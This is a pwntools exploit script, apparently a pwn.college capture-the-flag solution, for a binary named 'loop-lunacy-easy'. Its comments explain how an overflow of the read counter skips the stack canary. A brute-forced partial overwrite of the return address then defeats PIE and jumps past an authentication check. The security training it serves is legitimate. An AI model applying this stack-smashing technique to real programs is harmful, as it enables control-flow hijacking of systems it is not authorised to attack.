from pwn import *
import random

'''
this challenge with PIE and canary enabled
|xxxxxx| <- input buffer   rsp
|xxxxxx|
|xxxxxx|
|xxxxxx|
|nnnxxx| <- input offset
|xxxxxx|
|xxxxxx|
|xxxxxx|                   canary
|xxxxxx|                   rbp
|xxxxxx|                   saved return address

read payload like this:

while (n < size) {
  n += read(0, input_buff + n, 1);
}

1. luckily, the input offset `n` is after the input buffer, so we can overwrite the read counter
to skip the canary, in which case we can overwrite the saved return address directly.

2. Cause the PIE also enable, we just need to overwrite last three nibbles and guess fourth nibbles

3. win_authed has auth first, we need jump over that
   0x000000000000156b <+0>:     endbr64
   0x000000000000156f <+4>:     push   rbp
   0x0000000000001570 <+5>:     mov    rbp,rsp
   0x0000000000001573 <+8>:     sub    rsp,0x10
   0x0000000000001577 <+12>:    mov    DWORD PTR [rbp-0x4],edi
   0x000000000000157a <+15>:    cmp    DWORD PTR [rbp-0x4],0x1337
   0x0000000000001581 <+22>:    jne    0x1685 <win_authed+282>
   0x0000000000001587 <+28>:    lea    rdi,[rip+0x1b62]        # 0x30f0
   0x000000000000158e <+35>:    call   0x1130 <puts@plt>
   0x0000000000001593 <+40>:    mov    esi,0x0
   0x0000000000001598 <+45>:    lea    rdi,[rip+0x1b6d]        # 0x310c

'''

context.binary = elf = ELF('/challenge/loop-lunacy-easy')

input2savedreturn_offset = 104
inputbuff_len = 72
fixed_byte = b'\x87'
guess_byte = [bytes([i]) for i in range(0x05, 0x105, 0x10)]


while True:
    io = elf.process()

    # we only need input2savedreturn_offset + 2 to overwrite last-significant two byte of saved address
    io.sendline(str(input2savedreturn_offset + 2).encode())

    # cause n += read() will ++1 by itself, we need --1 first
    payload = cyclic(inputbuff_len) + p8(input2savedreturn_offset - 1) + fixed_byte + random.choice(guess_byte)
    io.sendline(payload)

    response = io.recvall()
    if b'pwn.college' in response:
        print(response.decode())
        exit()
